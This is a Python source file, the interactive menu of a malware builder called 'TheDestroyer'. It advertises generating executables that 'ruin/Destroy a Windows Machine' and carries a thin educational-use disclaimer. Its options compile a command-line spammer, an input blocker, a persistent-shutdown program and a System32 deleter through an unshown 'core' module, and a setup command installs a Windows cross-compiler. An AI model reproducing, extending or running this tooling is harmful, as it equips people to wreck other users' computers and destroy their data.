import os
try:
    import colorama
except ImportError:
    os.system("pip install colorama")
    print("Restart Program")
    exit(1)

from colorama import Fore, Style
import core


def __main__():
    core.clear()
    print(Style.BRIGHT + """ 

    \   \ ) __(  (  _( )__ __(/  _ \ / __ \ ) () ( ) __( /  _ \ 
    | ) ( | _)   _) \    | |  )  ' / ))__(( '.  /  | _)  )  ' / 
    /___/ )___( )____)   )_(  |_()_\ \____/  /_(   )___( |_()_\ 

    | TheDestroyer is a Framework that Generates Malware that'll 
    | ruin/Destroy a Windows Machine. This is made for Teaching/Educational
    | Purposes only. I am not responsible for any kind of misuse or Damage 
    | caused by the Program. 

    --> Linux Version - V.1                                
    """ + Style.RESET_ALL)
    print("[[ USER :: " + core.username() + " ]]")

    main = input(core.hostname()+"$> ")
    main = main.lower().strip()

    if(main == "help"):
        print(""" 
        Commands : 
        ~ help - Print this Help message
        ~ list - List available Destroyers
        ~ setup - Install  Required Packages
        ~ compile - Create a Destroyer
        ~ exit - Exit
        """)
        input(core.star_blue + " Press Enter.")
        __main__()
    elif(main == "list"):
        print("- Ded.exe (Ded.exe) - Command Line Spammer - " + core.check_status("Ded.exe"))
        print("- Pauser.exe (Pauser.exe) - Input Blocker - " + core.check_status("Pauser.exe"))
        print("- Persistent Shutdown (ps.exe) - " + core.check_status("ps.exe"))
        print("- delSystem32 - Obvious (sys32.exe) - " + core.check_status("sys32.exe"))
        print("- More coming soon.")
        input(core.star_blue + " Press Enter.")
        __main__()
    elif(main == "compile"):
        core.clear()
        print(""" 
        [1] Ded.exe - Command Line Spammer
        [2] Pauser - Input Blocker
        [3] Persistent Shutdown - Obvious
        [4] delSystem32 - Obvious
        [-] More coming soon..
        """)
        print(core.star_blue, "Enter Numeric Value below.")
        type = input(core.star_bold + " Select Destroyer to Generate : ")
        if(type == "1"):
            core.ded()
            input(core.star_blue + " Press Enter.")
            __main__()

        elif(type == "2"):
            core.pauser()
            input(core.star_blue + " Press Enter.")
            __main__()

        elif(type == "3"):
            core.ps()
            input(core.star_blue + " Press Enter.")
            __main__()
        
        elif(type == "4"):
            core.sys32()
            input(core.star_blue + " Press Enter.")
            __main__()

        else:
            input(core.star_blue + " Unidentified.")
            __main__()
        
    elif(main == "setup"):
        print(core.star_blue, "Will install Required Packages.")
        os.system("sudo apt-get install mingw-w64")
        print(core.star_cyan, "Done.")
        input(core.star_blue + " Press Enter.")
        __main__()
    elif(main == "exit"):
        exit(1)
    else:
        input(core.star_blue + " Type help.")
        __main__()




 

if __name__ == "__main__":
    __main__()